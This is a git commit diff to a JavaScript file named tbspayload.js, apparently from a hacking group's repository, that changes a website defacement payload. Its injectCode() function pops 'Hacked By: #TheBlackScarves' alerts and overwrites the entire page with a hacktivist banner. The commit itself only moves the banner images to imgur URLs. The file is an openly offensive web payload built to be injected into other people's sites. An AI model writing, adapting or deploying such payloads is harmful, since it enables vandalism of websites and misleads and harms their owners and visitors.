2a3811cda42df9dcbb295b967da34a03fb79e82e
tbs4321 <128443207+tbs4321@users.noreply.github.com>
2023-03-20 23:01:20 -0400

    Update tbspayload.js

--- tbspayload.js
+++ tbspayload.js
@@ -2,6 +2,6 @@ function injectCode(){
 
 alert('Hacked By: #TheBlackScarves');
 alert('Cody \(OGenDroX\) WAS HERE!');
-document.documentElement.innerHTML = '<html><head><title>#TheBlackScarves</title></head><body background="matrix.gif"><center><font size=12 color=#00ff00><b>#TheBlackScarves</b></font><br><br><br><img src=anonymous.png width=600 height=400><br><font color=#ffffff><b>We Are Legion. Expect Us.<br>Proud Support of Anonymous</b></font><br><br><marquee width=30% scrollamount=8> <font color=#00ff00><b>.: Greetz From OGenDroX Cody & #TheBlackScarves :. </b></font></center></body></html>';
+document.documentElement.innerHTML = '<html><head><title>#TheBlackScarves</title></head><body background="https://i.imgur.com/m9VQ3zV.gif"><center><font size=12 color=#00ff00><b>#TheBlackScarves</b></font><br><br><br><img src="https://i.imgur.com/OfCQ42y.png" width=600 height=400><br><font color=#ffffff><b>We Are Legion. Expect Us.<br>Proud Support of Anonymous</b></font><br><br><marquee width=30% scrollamount=8> <font color=#00ff00><b>.: Greetz From OGenDroX Cody & #TheBlackScarves :. </b></font></center></body></html>';
 
 }
